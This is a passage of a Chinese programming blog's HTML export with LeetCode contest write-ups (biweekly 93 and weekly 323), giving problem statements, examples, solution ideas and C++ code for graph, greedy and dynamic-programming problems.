class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!isNum) &#123;</span><br><span class="line">                res = <span class="built_in">max</span>(res, <span class="built_in">int</span>(strs[i].<span class="built_in">size</span>()));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                res = <span class="built_in">max</span>(res, <span class="built_in">stoi</span>(strs[i]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6262-图中最大星和"><a href="#6262-图中最大星和" class="headerlink" title="6262. 图中最大星和"></a>6262. 图中最大星和</h3><p>给你一个 <code>n</code> 个点的无向图，节点从 <code>0</code> 到 <code>n - 1</code> 编号。给你一个长度为 <code>n</code> 下标从 <strong>0</strong> 开始的整数数组 <code>vals</code> ，其中 <code>vals[i]</code> 表示第 <code>i</code> 个节点的值。</p>
<p>同时给你一个二维整数数组 <code>edges</code> ，其中 <code>edges[i] = [ai, bi]</code> 表示节点 <code>ai</code> 和 <code>bi</code> 之间有一条双向边。</p>
<p><strong>星图</strong> 是给定图中的一个子图，它包含一个中心节点和 <code>0</code> 个或更多个邻居。换言之，星图是给定图中一个边的子集，且这些边都有一个公共节点。</p>
<p>下图分别展示了有 <code>3</code> 个和 <code>4</code> 个邻居的星图，蓝色节点为中心节点。</p>
<p><img src="https://assets.leetcode.com/uploads/2022/11/07/max-star-sum-descdrawio.png" alt="img"></p>
<p><strong>星和</strong> 定义为星图中所有节点值的和。</p>
<p>给你一个整数 <code>k</code> ，请你返回 <strong>至多</strong> 包含 <code>k</code> 条边的星图中的 <strong>最大星和</strong> 。</p>
<p><strong>示例 1：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/11/07/max-star-sum-example1drawio.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：vals = [1,2,3,4,10,-10,-20], edges = [[0,1],[1,2],[1,3],[3,4],[3,5],[3,6]], k = 2</span><br><span class="line">输出：16</span><br><span class="line">解释：上图展示了输入示例。</span><br><span class="line">最大星和对应的星图在上图中用蓝色标出。中心节点是 3 ，星图中还包含邻居 1 和 4 。</span><br><span class="line">无法得到一个和大于 16 且边数不超过 2 的星图。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：vals = [-5], edges = [], k = 0</span><br><span class="line">输出：-5</span><br><span class="line">解释：只有一个星图，就是节点 0 自己。</span><br><span class="line">所以我们返回 -5 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>n == vals.length</code></li>
<li><code>1 &lt;= n &lt;= 105</code></li>
<li><code>-104 &lt;= vals[i] &lt;= 104</code></li>
<li><code>0 &lt;= edges.length &lt;= min(n * (n - 1) / 2``, 105)</code></li>
<li><code>edges[i].length == 2</code></li>
<li><code>0 &lt;= ai, bi &lt;= n - 1</code></li>
<li><code>ai != bi</code></li>
<li><code>0 &lt;= k &lt;= n - 1</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-93/problems/maximum-star-sum-of-a-graph/">https://leetcode.cn/contest/biweekly-contest-93/problems/maximum-star-sum-of-a-graph/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>排序
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>我们将与每个节点 $x$ 相邻的节点按照其值的从大到小进行排序，我们每次最多取 $k$ 个最大的相邻节点即可，即求前 $k$ 项的前缀和最大值即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(V \log E + V + E)$，其中 $V$ 为顶点的数目, $E$ 表示边的数目。</li>
<li>空间复杂度：$O(V + E)$，其中 $V$ 为顶点的数目, $E$ 表示边的数目。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxStarSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; vals, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; edges, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = vals.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">graph</span>(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : edges) &#123;</span><br><span class="line">            graph[v[<span class="number">0</span>]].<span class="built_in">emplace_back</span>(v[<span class="number">1</span>]);</span><br><span class="line">            graph[v[<span class="number">1</span>]].<span class="built_in">emplace_back</span>(v[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="built_in">sort</span>(graph[i].<span class="built_in">begin</span>(), graph[i].<span class="built_in">end</span>(), [&amp;](<span class="type">int</span> a, <span class="type">int</span> b) &#123;</span><br><span class="line">                <span class="keyword">return</span> vals[a] &gt; vals[b];</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> res = INT_MIN;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> sum = vals[i];</span><br><span class="line">            res = <span class="built_in">max</span>(res, sum);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; graph[i].<span class="built_in">size</span>() &amp;&amp; j &lt; k; j++) &#123;</span><br><span class="line">                sum += vals[graph[i][j]];</span><br><span class="line">                res = <span class="built_in">max</span>(res, sum);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="6263-青蛙过河-II"><a href="#6263-青蛙过河-II" class="headerlink" title="6263. 青蛙过河 II"></a>6263. 青蛙过河 II</h3><p>给你一个下标从 <strong>0</strong> 开始的整数数组 <code>stones</code> ，数组中的元素 <strong>严格递增</strong> ，表示一条河中石头的位置。</p>
<p>一只青蛙一开始在第一块石头上，它想到达最后一块石头，然后回到第一块石头。同时每块石头 <strong>至多</strong> 到达 <strong>一次。</strong></p>
<p>一次跳跃的 <strong>长度</strong> 是青蛙跳跃前和跳跃后所在两块石头之间的距离。</p>
<ul>
<li>更正式的，如果青蛙从 <code>stones[i]</code> 跳到 <code>stones[j]</code> ，跳跃的长度为 <code>|stones[i] - stones[j]|</code> 。</li>
</ul>
<p>一条路径的 <strong>代价</strong> 是这条路径里的 <strong>最大跳跃长度</strong> 。</p>
<p>请你返回这只青蛙的 <strong>最小代价</strong> 。</p>
<p><strong>示例 1：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/11/14/example-1.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：stones = [0,2,5,6,7]</span><br><span class="line">输出：5</span><br><span class="line">解释：上图展示了一条最优路径。</span><br><span class="line">这条路径的代价是 5 ，是这条路径中的最大跳跃长度。</span><br><span class="line">无法得到一条代价小于 5 的路径，我们返回 5 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/11/14/example-2.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：stones = [0,3,9]</span><br><span class="line">输出：9</span><br><span class="line">解释：</span><br><span class="line">青蛙可以直接跳到最后一块石头，然后跳回第一块石头。</span><br><span class="line">在这条路径中，每次跳跃长度都是 9 。所以路径代价是 max(9, 9) = 9 。</span><br><span class="line">这是可行路径中的最小代价。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>2 &lt;= stones.length &lt;= 105</code></li>
<li><code>0 &lt;= stones[i] &lt;= 109</code></li>
<li><code>stones[0] == 0</code></li>
<li><code>stones</code> 中的元素严格递增。</li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-93/problems/frog-jump-ii/">https://leetcode.cn/contest/biweekly-contest-93/problems/frog-jump-ii/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>贪心算法
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>最优算法肯定为隔一个元素跳，要么去的时候每次跳的步骤为 $[0,2,4,\cdots]$，要么回的时候每次跳的步骤则为 $[0,1,3,\cdots]$，题目等价于有两只青蛙从 $0$ 开始起跳，且二者没有共同落地地点都到达终点时的二者的最小跳的距离。</li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 表示数组的长度。</li>
<li>空间复杂度：时间复杂度为 $O(1)$。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxJump</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; stones)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = stones.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i += <span class="number">2</span>) &#123;</span><br><span class="line">            res = <span class="built_in">max</span>(res, stones[<span class="built_in">min</span>(i + <span class="number">2</span>, n - <span class="number">1</span>)] - stones[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i += <span class="number">2</span>) &#123;</span><br><span class="line">            res = <span class="built_in">max</span>(res, stones[<span class="built_in">min</span>(i + <span class="number">2</span>, n - <span class="number">1</span>)] - stones[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6264-让数组不相等的最小总代价"><a href="#6264-让数组不相等的最小总代价" class="headerlink" title="6264. 让数组不相等的最小总代价"></a>6264. 让数组不相等的最小总代价</h3><p>给你两个下标从 <strong>0</strong> 开始的整数数组 <code>nums1</code> 和 <code>nums2</code> ，两者长度都为 <code>n</code> 。</p>
<p>每次操作中，你可以选择交换 <code>nums1</code> 中任意两个下标处的值。操作的 <strong>开销</strong> 为两个下标的 <strong>和</strong> 。</p>
<p>你的目标是对于所有的 <code>0 &lt;= i &lt;= n - 1</code> ，都满足 <code>nums1[i] != nums2[i]</code> ，你可以进行 <strong>任意次</strong> 操作，请你返回达到这个目标的 <strong>最小</strong> 总代价。</p>
<p>请你返回让 <code>nums1</code> 和 <code>nums2</code> 满足上述条件的 <strong>最小总代价</strong> ，如果无法达成目标，返回 <code>-1</code> 。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [1,2,3,4,5], nums2 = [1,2,3,4,5]</span><br><span class="line">输出：10</span><br><span class="line">解释：</span><br><span class="line">实现目标的其中一种方法为：</span><br><span class="line">- 交换下标为 0 和 3 的两个值，代价为 0 + 3 = 3 。现在 nums1 = [4,2,3,1,5] 。</span><br><span class="line">- 交换下标为 1 和 2 的两个值，代价为 1 + 2 = 3 。现在 nums1 = [4,3,2,1,5] 。</span><br><span class="line">- 交换下标为 0 和 4 的两个值，代价为 0 + 4 = 4 。现在 nums1 = [5,3,2,1,4] 。</span><br><span class="line">最后，对于每个下标 i ，都有 nums1[i] != nums2[i] 。总代价为 10 。</span><br><span class="line">还有别的交换值的方法，但是无法得到代价和小于 10 的方案。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [2,2,2,1,3], nums2 = [1,2,2,3,3]</span><br><span class="line">输出：10</span><br><span class="line">解释：</span><br><span class="line">实现目标的一种方法为：</span><br><span class="line">- 交换下标为 2 和 3 的两个值，代价为 2 + 3 = 5 。现在 nums1 = [2,2,1,2,3] 。</span><br><span class="line">- 交换下标为 1 和 4 的两个值，代价为 1 + 4 = 5 。现在 nums1 = [2,3,1,2,2] 。</span><br><span class="line">总代价为 10 ，是所有方案中的最小代价。</span><br></pre></td></tr></table></figure>

<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [1,2,2], nums2 = [1,2,2]</span><br><span class="line">输出：-1</span><br><span class="line">解释：</span><br><span class="line">不管怎么操作，都无法满足题目要求。</span><br><span class="line">所以返回 -1 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>n == nums1.length == nums2.length</code></li>
<li><code>1 &lt;= n &lt;= 105</code></li>
<li><code>1 &lt;= nums1[i], nums2[i] &lt;= n</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-93/problems/minimum-total-cost-to-make-arrays-unequal/">https://leetcode.cn/contest/biweekly-contest-93/problems/minimum-total-cost-to-make-arrays-unequal/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> 数学问题</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>看了一个非常的好的解题思路，本质还是数论的问题：<a href="https://leetcode.cn/problems/minimum-total-cost-to-make-arrays-unequal/solutions/2015532/tan-xin-by-seedjyh-yih9/">题解</a></li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 表示数组的元素。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 表示数组的元素。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">minimumTotalCost</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, vector&lt;<span class="type">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums1.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; sameIndex;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums1[i] == nums2[i]) &#123;</span><br><span class="line">                sameIndex.<span class="built_in">push_back</span>(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; freq;</span><br><span class="line">        <span class="type">int</span> maxVal = <span class="number">-1</span>;</span><br><span class="line">        <span class="type">int</span> maxFreq = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> index : sameIndex) &#123;</span><br><span class="line">            freq[nums1[index]]++;</span><br><span class="line">            <span class="keyword">if</span> (freq[nums1[index]] &gt; maxFreq) &#123;</span><br><span class="line">                maxFreq = freq[nums1[index]];</span><br><span class="line">                maxVal = nums1[index];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (maxFreq * <span class="number">2</span> &lt;= sameIndex.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">accumulate</span>(sameIndex.<span class="built_in">begin</span>(), sameIndex.<span class="built_in">end</span>(), <span class="number">0LL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums1[i] == nums2[i]) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (nums1[i] != maxVal &amp;&amp; nums2[i] != maxVal) &#123;</span><br><span class="line">                sameIndex.<span class="built_in">push_back</span>(i);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (maxFreq * <span class="number">2</span> &lt;= sameIndex.<span class="built_in">size</span>()) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (maxFreq * <span class="number">2</span> &lt;= sameIndex.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">accumulate</span>(sameIndex.<span class="built_in">begin</span>(), sameIndex.<span class="built_in">end</span>(), <span class="number">0LL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://whistle-wind.com/">http://whistle-wind.com/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
        <tag>题解</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode  contest 323</title>
    <url>/2022/12/11/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/86/</url>
    <content><![CDATA[<h2 id="leetcode-contest-323"><a href="#leetcode-contest-323" class="headerlink" title="leetcode  contest 323"></a>leetcode  contest 323</h2><p>周赛的题目又是大放水了，感觉双周赛的题目比较难，周赛的题目放水的概率非常高。</p>
<h3 id="6257-删除每行中的最大值"><a href="#6257-删除每行中的最大值" class="headerlink" title="6257. 删除每行中的最大值"></a>6257. 删除每行中的最大值</h3><p>给你一个 <code>m x n</code> 大小的矩阵 <code>grid</code> ，由若干正整数组成。</p>
<p>执行下述操作，直到 <code>grid</code> 变为空矩阵：</p>
<ul>
<li>从每一行删除值最大的元素。如果存在多个这样的值，删除其中任何一个。</li>
<li>将删除元素中的最大值与答案相加。</li>
</ul>
<p><strong>注意</strong> 每执行一次操作，矩阵中列的数据就会减 1 。</p>
<p>返回执行上述操作后的答案。</p>
<p><strong>示例 1：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/10/19/q1ex1.jpg" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [[1,2,4],[3,3,1]]</span><br><span class="line">输出：8</span><br><span class="line">解释：上图展示在每一步中需要移除的值。</span><br><span class="line">- 在第一步操作中，从第一行删除 4 ，从第二行删除 3（注意，有两个单元格中的值为 3 ，我们可以删除任一）。在答案上加 4 。</span><br><span class="line">- 在第二步操作中，从第一行删除 2 ，从第二行删除 3 。在答案上加 3 。</span><br><span class="line">- 在第三步操作中，从第一行删除 1 ，从第二行删除 1 。在答案上加 1 。</span><br><span class="line">最终，答案 = 4 + 3 + 1 = 8 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/10/19/q1ex2.jpg" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [[10]]</span><br><span class="line">输出：10</span><br><span class="line">解释：上图展示在每一步中需要移除的值。</span><br><span class="line">- 在第一步操作中，从第一行删除 10 。在答案上加 10 。</span><br><span class="line">最终，答案 = 10 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>m == grid.length</code></li>
<li><code>n == grid[i].length</code></li>
<li><code>1 &lt;= m, n &lt;= 50</code></li>
<li><code>1 &lt;= grid[i][j] &lt;= 100</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-323/problems/delete-greatest-value-in-each-row/">https://leetcode.cn/contest/weekly-contest-323/problems/delete-greatest-value-in-each-row/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>将矩阵的每一行按照从小到大排序，每次我们取出每一列的最大值即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(mn\log n)$。</li>
<li>空间复杂度：$O(\log)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">deleteGreatestValue</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="built_in">sort</span>(grid[i].<span class="built_in">begin</span>(), grid[i].<span class="built_in">end</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> maxVal = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">                maxVal = <span class="built_in">max</span>(maxVal, grid[j][i]);</span><br><span class="line">            &#125;</span><br><span class="line">            res += maxVal;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6258-数组中最长的方波"><a href="#6258-数组中最长的方波" class="headerlink" title="6258. 数组中最长的方波"></a>6258. 数组中最长的方波</h3><p>给你一个整数数组 <code>nums</code> 。如果 <code>nums</code> 的子序列满足下述条件，则认为该子序列是一个 <strong>方波</strong> ：</p>
<ul>
<li>子序列的长度至少为 <code>2</code> ，并且</li>
<li>将子序列从小到大排序 <strong>之后</strong> ，除第一个元素外，每个元素都是前一个元素的 <strong>平方</strong> 。</li>
</ul>
<p>返回 <code>nums</code> 中 <strong>最长方波</strong> 的长度，如果不存在 <strong>方波</strong> 则返回 <code>-1</code> 。</p>
<p><strong>子序列</strong> 也是一个数组，可以由另一个数组删除一些或不删除元素且不改变剩余元素的顺序得到。</p>
<p><strong>示例 1 ：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [4,3,6,16,8,2]</span><br><span class="line">输出：3</span><br><span class="line">解释：选出子序列 [4,16,2] 。排序后，得到 [2,4,16] 。</span><br><span class="line">- 4 = 2 * 2.</span><br><span class="line">- 16 = 4 * 4.</span><br><span class="line">因此，[4,16,2] 是一个方波.</span><br><span class="line">可以证明长度为 4 的子序列都不是方波。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2 ：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [2,3,5,6,7]</span><br><span class="line">输出：-1</span><br><span class="line">解释：nums 不存在方波，所以返回 -1 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>2 &lt;= nums.length &lt;= 105</code></li>
<li><code>2 &lt;= nums[i] &lt;= 105</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-323/problems/longest-square-streak-in-an-array/">https://leetcode.cn/contest/weekly-contest-323/problems/longest-square-streak-in-an-array/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>动态规划
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>由于题目中方波数组的顺序必须满足从小到大排列，我们设 $dp[x]$ 表示以 $x$ 为结尾的方波数组的最长长度，则 $dp[x] &#x3D; dp[\sqrt{x}] + 1$。我们找到最长的方波数组长度即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log n)$，其中 $n$ 为数组的元素个数。</li>
<li>空间复杂度：$O(\log n)$，其中 $n$ 为数组的元素的个数。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">longestSquareStreak</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; dp;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            dp[nums[i]] = <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> x = <span class="built_in">sqrt</span>(nums[i]);</span><br><span class="line">            <span class="keyword">if</span> (x * x == nums[i]) &#123;</span><br><span class="line">                dp[nums[i]] = dp[x] + <span class="number">1</span>;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">if</span> (dp[nums[i]] &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                res = <span class="built_in">max</span>(res, dp[nums[i]]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6259-设计内存分配器"><a href="#6259-设计内存分配器" class="headerlink" title="6259. 设计内存分配器"></a>6259. 设计内存分配器</h3><p>给你一个整数 <code>n</code> ，表示下标从 <strong>0</strong> 开始的内存数组的大小。所有内存单元开始都是空闲的。</p>
<p>请你设计一个具备以下功能的内存分配器：</p>
<ol>
<li><strong>分配</strong> 一块大小为 <code>size</code> 的连续空闲内存单元并赋 id <code>mID</code> 。</li>
<li><strong>释放</strong> 给定 id <code>mID</code> 对应的所有内存单元。</li>
</ol>
<p><strong>注意：</strong></p>
<ul>
<li>多个块可以被分配到同一个 <code>mID</code> 。</li>
<li>你必须释放 <code>mID</code> 对应的所有内存单元，即便这些内存单元被分配在不同的块中。</li>
</ul>
<p>实现 <code>Allocator</code> 类：</p>
<ul>
<li><code>Allocator(int n)</code> 使用一个大小为 <code>n</code> 的内存数组初始化 <code>Allocator</code> 对象。</li>
<li><code>int allocate(int size, int mID)</code> 找出大小为 <code>size</code> 个连续空闲内存单元且位于 <strong>最左侧</strong> 的块，分配并赋 id <code>mID</code> 。返回块的第一个下标。如果不存在这样的块，返回 <code>-1</code> 。</li>
<li><code>int free(int mID)</code> 释放 id <code>mID</code> 对应的所有内存单元。返回释放的内存单元数目。</li>
</ul>
<p><strong>示例：</strong></p>
